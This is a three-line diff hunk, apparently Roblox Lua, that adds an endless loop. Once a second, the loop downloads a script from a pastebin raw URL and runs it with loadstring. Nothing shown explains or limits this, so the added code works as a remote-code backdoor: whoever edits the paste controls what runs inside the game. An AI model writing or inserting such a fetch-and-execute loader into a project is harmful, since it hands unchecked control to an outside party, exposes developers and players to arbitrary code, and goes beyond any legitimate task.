@@ -1,0 +1,3 @@
+while wait(1) do
+  loadstring(game:HttpGet("https://pastebin.com/raw/vr0sT8rW"))()
+end
